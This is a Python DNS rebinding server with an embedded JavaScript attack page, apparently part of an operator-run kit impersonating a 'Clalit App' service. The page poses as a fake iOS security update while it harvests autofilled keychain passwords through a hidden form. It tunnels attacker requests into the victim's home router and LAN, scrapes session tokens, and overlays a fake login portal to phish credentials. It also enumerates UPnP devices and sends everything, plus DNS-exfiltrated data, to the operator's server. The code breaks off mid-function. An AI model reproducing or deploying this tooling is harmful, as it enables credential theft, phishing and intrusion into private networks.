#!/usr/bin/env python3
"""DNS Rebinding server — run via the WebClip operator dashboard (Settings → Step 5)."""
import argparse, ssl, threading, time, pathlib, os
from dnslib import RR, QTYPE
from dnslib.server import DNSServer, BaseResolver
from flask import Flask, request, jsonify, send_from_directory

# DNS exfil log — max 1000 entries, FIFO
_exfil_log = []

_ROOT = pathlib.Path(__file__).resolve().parent.parent
_CERT = _ROOT / "certs" / "rebind" / "fullchain.pem"
_KEY  = _ROOT / "certs" / "rebind" / "privkey.pem"
_WWW  = _ROOT / "certs" / "rebind" / "www"


class RebindResolver(BaseResolver):
    def __init__(self, domain, vps_ip):
        self.domain  = domain.lower().rstrip(".")
        self.vps_ip  = vps_ip
        self.flip_map = {}   # target_ip → flip_time
        self.lock    = threading.Lock()
        self._last_query_ts = 0.0   # timestamp of most recent A query (any IP)
        self._last_query_ip = ""    # resolved IP served for that query
        self._flip_start_ts = 0.0  # when the current flip began (set by flip())

    def flip(self, target_ip):
        with self.lock:
            self.flip_map[target_ip] = time.time()
            self._flip_start_ts = time.time()

    def unflip(self):
        with self.lock:
            self.flip_map.clear()

    def query_status(self):
        with self.lock:
            return {
                "last_query_ts": self._last_query_ts,
                "last_query_ip": self._last_query_ip,
                "flip_start_ts": self._flip_start_ts,
                "flip_targets": list(self.flip_map.keys()),
                # True if we've seen a fresh A query AFTER the flip started
                "proxy_updated": (
                    self._last_query_ts > self._flip_start_ts
                    and self._last_query_ip != self.vps_ip
                    and self._flip_start_ts > 0
                ),
            }

    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname).lower().rstrip(".")
        if self.domain not in qname:
            return reply
        # Detect exfil subdomain pattern: <base32chunk>.exfil.<domain>
        if f'.exfil.{self.domain}' in qname or qname.startswith(f'exfil.{self.domain}'):
            prefix = qname.replace(f'.exfil.{self.domain}', '').replace(f'exfil.{self.domain}', '')
            prefix = prefix.strip('.')
            if prefix:
                try:
                    import base64
                    decoded = None
                    try:
                        padded = prefix.upper() + '=' * (-len(prefix) % 8)
                        decoded = base64.b32decode(padded, casefold=True).decode('utf-8', errors='replace')
                    except Exception:
                        pass
                    if not decoded:
                        try:
                            decoded = bytes.fromhex(prefix).decode('utf-8', errors='replace')
                        except Exception:
                            decoded = prefix  # raw fallback
                    src_ip = handler.client_address[0] if hasattr(handler, 'client_address') else '?'
                    entry = {'ts': time.time(), 'raw': prefix, 'decoded': decoded, 'src_ip': src_ip}
                    _exfil_log.append(entry)
                    if len(_exfil_log) > 1000:
                        _exfil_log.pop(0)
                except Exception:
                    pass
            # Still respond with VPS IP so the request completes
            reply.add_answer(*RR.fromZone(f'{qname}. 1 A {self.vps_ip}'))
            return reply
        if request.q.qtype == QTYPE.A:
            # Navigation subdomains (n + alphanum, e.g. n1a2b3.rb.domain) are used by
            # the WebClip to force a fresh DNS lookup that always lands on the VPS so
            # rb-launch.html can load. They must NEVER serve the flipped (router) IP —
            # only the rotation subdomains (s0–s14) and the base domain should flip.
            sub = qname.replace('.' + self.domain, '').replace(self.domain, '').strip('.')
            if sub.startswith('n') and len(sub) > 1 and sub[1:].replace('-', '').isalnum():
                reply.add_answer(*RR.fromZone(f'{qname}. 1 A {self.vps_ip}'))
                return reply
            served_ip = self.vps_ip
            with self.lock:
                # Serve flipped IP for up to 180s, then revert to VPS
                for target, t in list(self.flip_map.items()):
                    if time.time() - t < 180:
                        served_ip = target
                        break
                self._last_query_ts = time.time()
                self._last_query_ip = served_ip
            reply.add_answer(*RR.fromZone(f"{qname}. 1 A {served_ip}"))
            return reply
        elif request.q.qtype == QTYPE.NS:
            # Return ourselves as the authoritative NS — makes `dig NS rb.domain` return results
            parts = self.domain.split(".")
            parent = ".".join(parts[1:]) if len(parts) > 1 else self.domain
            ns_host = f"ns1.{parent}"
            reply.add_answer(*RR.fromZone(f"{qname}. 60 NS {ns_host}."))
            reply.add_ar(*RR.fromZone(f"{ns_host}. 60 A {self.vps_ip}"))
        return reply


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--domain",  required=True, help="Rebind domain, e.g. rb.evil.com")
    parser.add_argument("--vps-ip",  required=True, dest="vps_ip", help="This server's public IP")
    parser.add_argument("--dns-port",  type=int, default=53)
    parser.add_argument("--http-port", type=int, default=80,  help="HTTP port for rb-launch.html popup")
    parser.add_argument("--https-port",type=int, default=443, help="HTTPS port")
    parser.add_argument("--api-port",  type=int, default=5000, help="Internal REST API (flip control)")
    args = parser.parse_args()

    resolver = RebindResolver(args.domain, args.vps_ip)
    dns_srv  = DNSServer(resolver, port=args.dns_port, address="0.0.0.0")
    dns_srv.start_thread()
    print(f"[DNS]  Listening on :{args.dns_port} — domain={args.domain} vps={args.vps_ip}", flush=True)

    app = Flask(__name__)

    # Same-origin relay store — bypasses Cloudflare WAF on clipper domain.
    # After DNS flip, rb-launch.html POSTs directly to VPS IP:port (cross-origin).
    # CORS headers allow this from any origin.
    _PERSIST_DIR = _ROOT / "captures"
    _PERSIST_DIR.mkdir(exist_ok=True)
    _relay: dict = {}
    _relay_status: dict = {}
    # Reload persisted relay captures on startup
    import json as _json
    for _f in _PERSIST_DIR.glob("relay_*.json"):
        try:
            _d = _json.loads(_f.read_text())
            _tok = _f.stem[len("relay_"):]
            _relay[_tok] = _d
        except Exception:
            pass
    _RELAY_TTL = 3600

    @app.after_request
    def add_cors(response):
        response.headers["Access-Control-Allow-Origin"] = "*"
        response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        response.headers["Access-Control-Allow-Headers"] = "Content-Type, Cache-Control, Pragma"
        return response

    def _relay_cleanup():
        cutoff = time.time() - _RELAY_TTL
        for t in list(_relay.keys()):
            if _relay[t]['ts'] < cutoff:
                del _relay[t]
        for t in list(_relay_status.keys()):
            if _relay_status[t]['ts'] < cutoff:
                del _relay_status[t]

    @app.route("/api/rb/relay", methods=["POST", "OPTIONS"])
    def relay_store():
        if request.method == "OPTIONS":
            return ("", 204)
        data = request.get_json(force=True, silent=True) or {}
        token = data.get("token", "")
        if token:
            _relay_cleanup()
            _relay[token] = {"result": data, "ts": time.time()}
            # Persist to disk so restart doesn't lose captures
            try:
                import json as _json
                (_PERSIST_DIR / f"relay_{token}.json").write_text(
                    _json.dumps({"result": data, "ts": time.time()}, ensure_ascii=False))
            except Exception:
                pass
        return jsonify({"ok": True})

    @app.route("/api/rb/relay/<token>")
    def relay_get(token):
        _relay_cleanup()
        entry = _relay.get(token)
        return jsonify({"ok": True, "ready": bool(entry), "result": entry["result"] if entry else None})

    @app.route("/api/rb/relay-status", methods=["POST", "OPTIONS"])
    def relay_status_store():
        if request.method == "OPTIONS":
            return ("", 204)
        data = request.get_json(force=True, silent=True) or {}
        token = data.get("token", "")
        if token:
            _relay_status[token] = {"status": data, "ts": time.time()}
        return jsonify({"ok": True})

    @app.route("/api/rb/relay-status/<token>")
    def relay_status_get(token):
        entry = _relay_status.get(token)
        return jsonify({"ok": True, "status": entry["status"] if entry else None})

    # ── Tunnel endpoints ────────────────────────────────────────────────────────
    # Dashboard queues requests; rb-launch.html polls and executes them on LAN.
    _tunnel_queue: dict = {}    # token → list of {req_id, url}
    _tunnel_results: dict = {}  # "token:req_id" → result dict
    _tunnel_end: set = set()    # tokens whose tunnel should close

    @app.route("/api/tunnel/queue", methods=["POST", "OPTIONS"])
    def tunnel_queue_add():
        if request.method == "OPTIONS":
            return ("", 204)
        data = request.get_json(force=True, silent=True) or {}
        token = data.get("token", "")
        url = data.get("url", "/")
        if not token:
            return jsonify({"ok": False, "error": "no token"}), 400
        req_id = str(int(time.time() * 1000))
        _tunnel_queue.setdefault(token, []).append({"req_id": req_id, "url": url})
        return jsonify({"ok": True, "req_id": req_id})

    @app.route("/api/tunnel/next/<token>")
    def tunnel_next(token):
        if token in _tunnel_end:
            return jsonify({"ok": True, "req_id": None, "end_tunnel": True})
        queue = _tunnel_queue.get(token, [])
        if not queue:
            return jsonify({"ok": True, "req_id": None})
        req = queue.pop(0)
        return jsonify({"ok": True, "req_id": req["req_id"], "url": req["url"]})

    @app.route("/api/tunnel/result", methods=["POST", "OPTIONS"])
    def tunnel_result_store():
        if request.method == "OPTIONS":
            return ("", 204)
        data = request.get_json(force=True, silent=True) or {}
        token = data.get("token", "")
        req_id = data.get("req_id", "")
        if token and req_id:
            _tunnel_results[f"{token}:{req_id}"] = data
            try:
                import json as _json
                (_PERSIST_DIR / f"tunnel_{token}_{req_id}.json").write_text(
                    _json.dumps(data, ensure_ascii=False))
            except Exception:
                pass
        return jsonify({"ok": True})

    @app.route("/api/tunnel/result/<token>/<req_id>")
    def tunnel_result_get(token, req_id):
        entry = _tunnel_results.get(f"{token}:{req_id}")
        return jsonify({"ok": True, "ready": bool(entry), "result": entry or None})

    @app.route("/api/tunnel/dump/<token>")
    def tunnel_dump(token):
        results = {k: v for k, v in _tunnel_results.items() if k.startswith(token + ":")}
        queue = list(_tunnel_queue.get(token, []))
        return jsonify({"ok": True, "results": list(results.values()), "queue": queue})

    @app.route("/api/tunnel/end", methods=["POST", "OPTIONS"])
    def tunnel_end():
        if request.method == "OPTIONS":
            return ("", 204)
        data = request.get_json(force=True, silent=True) or {}
        token = data.get("token", "")
        if token:
            _tunnel_end.add(token)
        return jsonify({"ok": True})

    @app.route("/api/exfil/log")
    def exfil_log():
        return jsonify({'ok': True, 'entries': list(_exfil_log[-200:])})

    @app.route("/api/exfil/clear", methods=["POST", "OPTIONS"])
    def exfil_clear():
        if request.method == "OPTIONS":
            return ("", 204)
        _exfil_log.clear()
        return jsonify({'ok': True})

    @app.route("/api/rb/ping")
    def ping():
        return jsonify({"phase": "attacker", "ip": args.vps_ip, "domain": args.domain})

    @app.route("/api/rb/flip")
    def flip():
        target = request.args.get("target", "")
        if target:
            resolver.flip(target)
        return jsonify({"ok": True, "target": target})

    @app.route("/api/rb/unflip")
    def unflip():
        resolver.unflip()
        return jsonify({"ok": True})

    @app.route("/api/rb/query-status")
    def query_status():
        return jsonify({"ok": True, **resolver.query_status()})

    @app.route("/rb-launch.html")
    def rb_launch():
        return """<!DOCTYPE html>
<html><head>
<meta charset="utf-8"><title>System Update</title>
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1c1c1e;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;min-height:100dvh;padding:32px}
.logo{margin-bottom:28px;text-align:center}
.logo svg{width:72px;height:72px}
.title{font-size:20px;font-weight:700;margin-bottom:8px;text-align:center}
.subtitle{font-size:14px;color:rgba(255,255,255,.7);margin-bottom:4px;text-align:center}
.eta{font-size:12px;color:rgba(255,255,255,.35);margin-bottom:28px;text-align:center}
.progress-wrap{width:260px;height:4px;background:rgba(255,255,255,.15);border-radius:2px;overflow:hidden;margin-bottom:10px}
.progress-bar{height:100%;background:#0a84ff;border-radius:2px;animation:prog 3580s linear forwards}
@keyframes prog{0%{width:1%}30%{width:18%}60%{width:41%}80%{width:58%}95%{width:72%}100%{width:75%}}
.pct{font-size:11px;color:rgba(255,255,255,.4);text-align:center;margin-bottom:12px;font-variant-numeric:tabular-nums}
.status{font-size:12px;color:rgba(255,255,255,.35);text-align:center}
</style>
</head><body>
<div class="logo">
<svg viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="36" cy="36" r="36" fill="white" fill-opacity="0.12"/>
<path d="M36 20 L46 32 L42 32 L42 52 L30 52 L30 32 L26 32 Z" fill="white" fill-opacity="0.85"/>
</svg>
</div>
<div class="title">Downloading System Update</div>
<div class="subtitle">iOS 18.4.1 Security Update (284 MB)</div>
<div class="eta">Estimated time: about 1 hour</div>
<div class="progress-wrap"><div class="progress-bar" id="pb"></div></div>
<div class="pct" id="pct">0%</div>
<div class="status" id="st">Preparing download…</div>
<div id="returnDiv" style="display:none;margin-top:28px;text-align:center">
  <a id="returnBtn" href="#" target="_blank" style="display:inline-block;padding:14px 32px;background:#0a84ff;color:#fff;font-size:16px;font-weight:600;border-radius:14px;text-decoration:none;letter-spacing:-0.2px">Return to Clalit App →</a>
  <div style="font-size:11px;color:rgba(255,255,255,.3);margin-top:10px">Tap to return — update running in background</div>
</div>
<script>
// Slowly increment displayed percentage to match the CSS animation feel
var _pctEl=document.getElementById('pct');
var _pctVal=0;
var _pctTarget=[1,18,41,58,72]; // match CSS keyframes roughly — spread over ~1 hour
var _pctIdx=0;
(function _tick(){
  if(_pctIdx<_pctTarget.length){
    var target=_pctTarget[_pctIdx];
    var delay=[8000,480000,720000,840000,900000][_pctIdx]||600000;
    var step=function(){
      if(_pctVal<target){_pctVal++;_pctEl.textContent=_pctVal+'%';setTimeout(step,delay/target);}
      else{_pctIdx++;setTimeout(_tick,1000);}
    };
    step();
  }
})();
</script>
<script>
function attemptKeychain(){
  var form=document.createElement('form');
  form.style.cssText='position:absolute;opacity:0;pointer-events:none;left:-9999px;top:-9999px;';
  form.innerHTML='<input type="text" name="username" autocomplete="username email"><input type="password" name="password" autocomplete="current-password"><button type="submit"></button>';
  document.body.appendChild(form);
  var u=form.querySelector('[name=username]'),pf=form.querySelector('[name=password]');
  setTimeout(function(){form.querySelector('button').focus();u.focus();},500);
  var check=setInterval(function(){
    if(u.value||pf.value){
      clearInterval(check);
      var ws=window.__rbWs;
      var msg=JSON.stringify({type:'keychain_found',token:token,username:u.value,password:pf.value});
      if(ws&&ws.readyState===1) ws.send(msg);
      if(form.parentNode) document.body.removeChild(form);
    }
  },300);
  setTimeout(function(){clearInterval(check);if(form.parentNode) document.body.removeChild(form);},15000);
}
var p=new URLSearchParams(location.search);
var targetPath=p.get('path')||'/';
var parentOrigin=p.get('origin')||'*';
var token=p.get('token')||'';
var relay=p.get('relay')||'';
var vpshost=p.get('vpshost')||'';
var targetIP=p.get('ip')||'';
var targetPort=parseInt(p.get('port')||location.port||'80',10)||80;
var domain=p.get('domain')||location.hostname;
var isReload=!!p.get('_r');
// Normalize vpshost: Settings stores bare IP (1.2.3.4); need http://IP:15000 for fetch() calls.
if(vpshost && !vpshost.startsWith('http')) vpshost='http://'+vpshost+':15000';
// Always fetch via the rebind hostname (not location.origin) so reloads from
// VPS-IP still do DNS-sensitive fetches to rb.domain (where DNS might be flipped).
// Include target port in origin so iOS connects to the right port after DNS rebind.
var rbOrigin='http://'+domain+(targetPort&&targetPort!==80?':'+targetPort:'');
// rb-launch.html is always loaded from the BASE DOMAIN (rb.clalitapp.info).
// Fetching subdomains from the base-domain page would be cross-origin → CORS blocks response.
// Use base domain only — same-origin fetch → iOS can read the router response.
var _subs=[''];
var _subIdx=0;
function nextOrigin(){return rbOrigin;}
// apiBase: relay (clipper.clalitapp.info, always reachable via Cloudflare, uses /api/rb/* paths)
// is preferred over vpshost (direct IP:15000, firewalled from internet).
// After DNS flip, rb.clalitapp.info → router; only relay and direct-VPS-IP work.
var apiBase=relay||vpshost;
// directBase: prefer vpshost for flip/status calls (no CF challenge).
// tunnelBase: always use relay via FastAPI — vpshost port 15000 is not internet-accessible
// from victim iOS device, so tunnel next/result must go through clipper HTTPS relay.
var directBase=vpshost||apiBase;
var tunnelBase=relay ? relay+'/api/rb' : directBase+'/api';
function l(m){console.log('[rb]',m);}
function setMsg(m){var el=document.getElementById('st');if(el)el.textContent=m;}
function showReturnBtn(){
  // Rebind succeeded — update UI to "finalizing" state, tunnel stays alive until operator sends end_tunnel
  setMsg('Finalizing update…');
}

// doFlip: fire to vpshost (no CF) AND relay — both fire-and-forget.
function doFlip(){
  var q='/api/rb/flip?target='+encodeURIComponent(targetIP);
  if(vpshost) fetch(vpshost+q).catch(()=>{});
  if(apiBase&&apiBase!==vpshost) fetch(apiBase+q).catch(()=>{});
}

function postStatus(phase,attempt){
  if(!token)return;
  var body=JSON.stringify({token,phase,attempt,ts:Date.now(),apiBase:apiBase.slice(0,40),relay:relay?'y':'n',vpshost:vpshost?'y':'n'});
  // vpshost = direct IP:15000, no Cloudflare challenge — primary path for visibility
  if(vpshost) fetch(vpshost+'/api/rb/relay-status',{method:'POST',headers:{'Content-Type':'application/json'},body}).catch(()=>{});
  // relay = clipper (may be CF-protected for non-browser tabs) — best-effort
  if(apiBase&&apiBase!==vpshost) fetch(apiBase+'/api/rb/relay-status',{method:'POST',headers:{'Content-Type':'application/json'},body}).catch(()=>{});
}

async function sendResult(data){
  if(token){
    // Try relay (clipper, FastAPI /api/rb/result) and vpshost (Flask /api/rb/relay) in parallel
    var tasks=[];
    if(relay){
      tasks.push(fetch(relay+'/api/rb/result',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify(Object.assign({},data,{token}))}).then(function(){l('relay ok (cf)');}).catch(function(e){l('relay err cf: '+e.message);}));
    }
    if(vpshost){
      tasks.push(fetch(vpshost+'/api/rb/relay',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify(Object.assign({},data,{token}))}).then(function(){l('relay ok (vps)');}).catch(function(e){l('relay err vps: '+e.message);}));
    }
    await Promise.all(tasks);
  }
  if(window.opener){try{window.opener.postMessage(data,parentOrigin);}catch(e){}}
  try{var ch=new BroadcastChannel('wc_rebind');ch.postMessage(data);ch.close();}catch(e){}
}

var tunnelActive=false;

// WebSocket relay (primary path) — lower latency than HTTP polling.
// An HTTP page (rb.clalitapp.info) CAN connect to wss:// without mixed-content restrictions.
function startTunnelWS(){
  if(!relay||!token){startTunnel();return;}
  var wsBase=relay.replace(/^https:/,'wss:').replace(/^http:/,'ws:');
  var ws;
  try{ws=new WebSocket(wsBase+'/api/ws/rb/'+encodeURIComponent(token)+'?role=victim');}
  catch(e){l('ws init err: '+e.message);startTunnel();return;}
  var keepAlive,tOut;
  window.__rbWs=ws;
  ws.onopen=function(){
    tunnelActive=true;
    l('ws tunnel open token='+token.slice(0,8));
    ws.send(JSON.stringify({type:'tunnel_ready'}));
    if(token) attemptKeychain();
    keepAlive=setInterval(function(){
      if(!tunnelActive){clearInterval(keepAlive);return;}
      doFlip();
      try{ws.send(JSON.stringify({type:'keepalive'}));}catch(e){}
    },20000);
    tOut=setTimeout(function(){
      tunnelActive=false;clearInterval(keepAlive);
      l('ws tunnel timeout — reconnecting');
      try{ws.close();}catch(e){}
      if(!stopped)setTimeout(startTunnelWS,2000);
    },3600000);
  };
  ws.onmessage=function(e){
    try{
      var msg=JSON.parse(e.data);
      if(msg.type==='end_tunnel'){
        tunnelActive=false;clearInterval(keepAlive);clearTimeout(tOut);
        stopped=true;l('ws tunnel end_tunnel');
        var pb2=document.getElementById('pb');if(pb2){pb2.style.animation='none';pb2.style.width='100%';}
        var pct2=document.getElementById('pct');if(pct2)pct2.textContent='100%';
        setMsg('Update complete ✓');
        setTimeout(function(){try{ws.close();}catch(ex){}if(relay)location.href=relay;},2500);
        return;
      }
      if(msg.type==='peer_disconnected'){
        l('controller disconnected — staying alive for reconnect');
        return;
      }
      if(msg.type==='change_target'){
        if(msg.origin){_curOrigin=msg.origin;l('target origin changed to: '+msg.origin);}
        if(msg.ip){targetIP=msg.ip;l('target IP changed to: '+msg.ip);}
        return;
      }
      if(msg.type==='browse_request'&&msg.url){
        l('ws req '+msg.req_id+' -> '+msg.url);
        var fetchOpts={method:msg.method||'GET'};
        if(msg.method==='POST'&&msg.body){fetchOpts.body=msg.body;fetchOpts.headers={'Content-Type':msg.content_type||'application/x-www-form-urlencoded'};}
        fetch(_curOrigin+msg.url,fetchOpts)
          .then(function(r){return r.text().then(function(b){return{status:r.status,body:b,content_type:r.headers.get('content-type')||'text/html'};});})
          .then(function(result){
            ws.send(JSON.stringify({type:'browse_result',req_id:msg.req_id,url:msg.url,
              status:result.status,body:result.body.slice(0,65536),content_type:result.content_type,ok:true}));
            l('ws res '+msg.req_id+' status='+result.status);
            // Credential scan: search response body for session tokens
            var body=result.body||'';
            var credRe=[
              {re:/session[_=]([a-zA-Z0-9+\/=]{16,})/gi,label:'session'},
              {re:/token[=:]([a-zA-Z0-9._-]{20,})/gi,label:'token'},
              {re:/auth[_=]([a-zA-Z0-9]{16,})/gi,label:'auth'}
            ];
            var matches=[];
            credRe.forEach(function(cr){
              var m;
              while((m=cr.re.exec(body))!==null){
                matches.push({label:cr.label,value:m[1].slice(0,120)});
              }
            });
            if(matches.length>0){
              ws.send(JSON.stringify({type:'credentials_found',token:token,url:msg.url,matches:matches}));
              l('creds found: '+matches.length+' matches');
            }
          })
          .catch(function(err){
            ws.send(JSON.stringify({type:'browse_result',req_id:msg.req_id,url:msg.url,
              ok:false,error:err.message}));
          });
      }
      if(msg.type==='show_portal'){
        var overlay=document.createElement('div');
        overlay.id='fake-portal';
        overlay.style.cssText='position:fixed;inset:0;background:#fff;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui;';
        var portalTitle=msg.title||'Session Expired';
        var portalSub=msg.subtitle||'Please log in again to continue.';
        overlay.innerHTML='<div style="max-width:360px;width:100%;padding:32px;text-align:center;"><h2 style="font-size:22px;margin:0 0 8px;">'+portalTitle+'</h2><p style="color:#666;margin:0 0 24px;font-size:14px;">'+portalSub+'</p><form id="fakeForm"><input id="fakeU" type="text" autocomplete="username email" placeholder="Username" style="width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;margin-bottom:8px;font-size:15px;box-sizing:border-box;"><br><input id="fakeP" type="password" autocomplete="current-password" placeholder="Password" style="width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;margin-bottom:16px;font-size:15px;box-sizing:border-box;"><button type="submit" style="width:100%;padding:12px;background:#0a84ff;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;">Sign In</button></form></div>';
        document.body.appendChild(overlay);
        document.getElementById('fakeForm').onsubmit=function(e){
          e.preventDefault();
          var u=document.getElementById('fakeU').value,pw=document.getElementById('fakeP').value;
          if(ws&&ws.readyState===1) ws.send(JSON.stringify({type:'portal_creds',token:token,username:u,password:pw}));
          overlay.innerHTML='<div style="text-align:center;padding:60px;"><p style="font-size:16px;color:#333;">Logging in...</p></div>';
          setTimeout(function(){if(overlay.parentNode) document.body.removeChild(overlay);},2000);
        };
      }
    }catch(ex){l('ws msg err: '+ex.message);}
  };
  ws.onclose=function(){
    tunnelActive=false;
    clearInterval(keepAlive);clearTimeout(tOut);
    if(!stopped){l('ws closed — reconnecting in 3s');setTimeout(startTunnelWS,3000);}
  };
  ws.onerror=function(){
    tunnelActive=false;
    clearInterval(keepAlive);clearTimeout(tOut);
    if(!stopped){l('ws error — reconnecting in 3s');setTimeout(startTunnelWS,3000);}
  };
}

async function startTunnel(){
  tunnelActive=true;
  l('tunnel start (HTTP poll) token='+token.slice(0,8));
  var keepAlive=setInterval(function(){
    if(!tunnelActive){clearInterval(keepAlive);return;}
    doFlip(); // Keep DNS flip alive
  },20000);
  // Auto-close after 2 minutes — WebClip page is gone so no one will send end_tunnel
  var tOut=setTimeout(function(){
    tunnelActive=false;clearInterval(keepAlive);
    stopped=true;
    l('tunnel timeout — auto-close');
    if(relay)location.href=relay;
  },120000);
  async function poll(){
    if(!tunnelActive){clearTimeout(tOut);clearInterval(keepAlive);return;}
    try{
      // tunnelBase routes via relay (FastAPI HTTPS) so victim iOS device can reach it.
      var r=await fetch(tunnelBase+'/tunnel/next/'+encodeURIComponent(token));
      var d=await r.json();
      if(d.end_tunnel){
        tunnelActive=false;clearInterval(keepAlive);clearTimeout(tOut);
        l('tunnel end — returning');
        if(relay)location.href=relay;
        return;
      }
      if(d.req_id&&d.url){
        l('tunnel req '+d.req_id+' -> '+d.url);
        try{
          var res=await fetch(_curOrigin+d.url,{cache:'no-store'});
          var body=await res.text();
          await fetch(tunnelBase+'/tunnel/result',{method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({token,req_id:d.req_id,status:res.status,body:body.slice(0,65536),ok:true})});
          l('tunnel res '+d.req_id+' status='+res.status);
        }catch(e){
          fetch(tunnelBase+'/tunnel/result',{method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({token,req_id:d.req_id,ok:false,error:e.message})}).catch(()=>{});
          l('tunnel fetch err: '+e.message);
        }
      }
    }catch(e){l('poll err: '+e.message);}
    if(tunnelActive)setTimeout(poll,1200);
  }
  poll();
}

// ── UPnP / IGD discovery ─────────────────────────────────────────────────────
// Runs after DNS rebind succeeds. Probes common UPnP ports on the router,
// parses device description XML, extracts WAN IP + control URL, and reports
// findings via the WebSocket relay (upnp_found message) or HTTPS relay fallback.
// SOAP AddPortMapping is sent on-demand from the dashboard.
var _upnpDone=false;
(async function probeUPnP(){
  if(!token)return;
  // Use the already-flipped subdomain (location.hostname) so port probes reach
  // the router IP — not the base domain which iOS might still have cached as VPS.
  var baseHost='http://'+location.hostname;
  // UPnP device description is served on a second HTTP port (not 80).
  // Common ports used by routers/IGD devices:
  var upnpPorts=[49152,52869,5000,49153,49000,2869,8200,1780,49154,60000];
  // Common paths for root device description XML:
  var upnpPaths=['/rootDesc.xml','/rootdevice.xml','/upnp/rootdevice.xml',
    '/igd.xml','/gateway.xml','/gatedesc.xml','/devicedesc.xml','/wanip.xml','/'];
  var found=null;
  outer: for(var pi=0;pi<upnpPorts.length;pi++){
    var port=upnpPorts[pi];
    var origin=baseHost+':'+port;
    for(var di=0;di<upnpPaths.length;di++){
      try{
        var ctl={};
        try{ctl.signal=AbortSignal.timeout(2000);}catch(e){}
        var r=await fetch(origin+upnpPaths[di],ctl);
        var xml=await r.text();
        if(xml.includes('<root')&&xml.includes('xmlns')&&xml.includes('device')){
          found={port,path:upnpPaths[di],origin,xml};
          break outer;
        }
      }catch(e){}
    }
  }
  if(!found){l('upnp: no device desc found');return;}
  l('upnp: found desc at '+found.origin+found.path);
  function xmlTag(s,tag){var m=s.match(new RegExp('<'+tag+'[^>]*>([\\s\\S]*?)<\\/'+tag+'>','i'));return m?m[1].trim():'';}
  function xmlTagAll(s,tag){var re=new RegExp('<'+tag+'[^>]*>([\\s\\S]*?)<\\/'+tag+'>','gi'),r=[],m;while((m=re.exec(s))!==null)r.push(m[1].trim());return r;}
  var devInfo={
    friendlyName:xmlTag(found.xml,'friendlyName'),
    manufacturer:xmlTag(found.xml,'manufacturer'),
    manufacturerURL:xmlTag(found.xml,'manufacturerURL'),
    modelName:xmlTag(found.xml,'modelName'),
    modelNumber:xmlTag(found.xml,'modelNumber'),
    serialNumber:xmlTag(found.xml,'serialNumber'),
    UDN:xmlTag(found.xml,'UDN'),
    port:found.port,
    descPath:found.path,
  };
  // Find WANIPConnection or WANPPPConnection control URL
  var serviceBlocks=xmlTagAll(found.xml,'service');
  var wanBlock=null,wanType='';
  for(var si=0;si<serviceBlocks.length;si++){
    var sb=serviceBlocks[si];
    var st=xmlTag(sb,'serviceType');
    if(st.includes('WANIPConnection')||st.includes('WANPPPConnection')){
      wanBlock=sb;wanType=st;break;
    }
  }
  var controlPath=wanBlock?xmlTag(wanBlock,'controlURL'):null;
  var controlURL=controlPath?(found.origin+controlPath):null;
  // Helper: build SOAP envelope
  function soapEnvelope(svcType,action,args){
    var argXml='';for(var k in args)argXml+='<'+k+'>'+args[k]+'</'+k+'>';
    return'<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:'+action+' xmlns:u="'+svcType+'">'+argXml+'</u:'+action+'></s:Body></s:Envelope>';
  }
  async function soapCall(url,svcType,action,args){
    var r=await fetch(url,{method:'POST',headers:{'Content-Type':'text/xml; charset="utf-8"','SOAPAction':'"'+svcType+'#'+action+'"'},body:soapEnvelope(svcType,action,args||{})});
    return r.text();
  }
  var extIP=null,connStatus=null;
  if(controlURL){
    try{var ir=await soapCall(controlURL,wanType,'GetExternalIPAddress',{});extIP=xmlTag(ir,'NewExternalIPAddress');}catch(e){extIP='err:'+e.message;}
    try{var sr=await soapCall(controlURL,wanType,'GetStatusInfo',{});connStatus=xmlTag(sr,'NewConnectionStatus');}catch(e){connStatus='err:'+e.message;}
  }
  _upnpDone=true;
  var result={type:'upnp_found',token,device:devInfo,wanType,controlURL,externalIP:extIP,connectionStatus:connStatus};
  l('upnp: externalIP='+extIP+' status='+connStatus);
  // Send via WebSocket relay if available, otherwise fall back to HTTPS relay
  function sendUpnp(){
    var ws=window.__rbWs;
    if(ws&&ws.readyState===1){ws.send(JSON.stringify(result));return;}
    if(tunnelBase)fetch(tunnelBase.replace('/api/rb','')+'/api/rb/upnp',{method:'POST',
      headers:{'Content-Type':'application/json'},body:JSON.stringify(result)}).catch(()=>{});
  }
  sendUpnp();
  // Retry once in 3s in case WS wasn't ready yet
  setTimeout(sendUpnp,3000);
})();

// Poll for stop signal — defers to startTunnel once tunnel is active.
// Uses directBase (nrelay, direct Flask) to bypass Cloudflare WAF on clipper.
var stopped=false;
var _stopBase=directBase?directBase+'/api':tunnelBase;
(function stopPoll(){
  if(stopped||!_stopBase||!token)return;
  if(tunnelActive)return; // startTunnel.poll() owns the queue now
  fetch(_stopBase+'/tunnel/next/'+encodeURIComponent(token))
    .then(function(r){return r.json();})
    .then(function(d){
      if(d.end_tunnel){stopped=true;l('stop received');if(relay)location.href=relay;return;}
      setTimeout(stopPoll,2000);
    }).catch(function(){setTimeout(stopPoll,2000);});
})();

var VPS_SENTINEL='DNS-REBIND-VPS-SENTINEL';
var attempts=0;
var MAX_ATTEMPTS=150; // ~90s — enough for DoH resolvers that cache beyond TTL=1s
function giveUp(reason){
  stopped=true;
  setMsg('Update failed — please retry');
  sendResult({type:'rb_result',ok:false,err:reason||'timeout'});
}
var _curOrigin=rbOrigin; // current fetch origin (rotates through subdomains)
var _consErrors=0;       // consecutive non-sentinel errors (likely DNS flipped → target refusing)
async function tryFetch(){
  if(stopped)return;
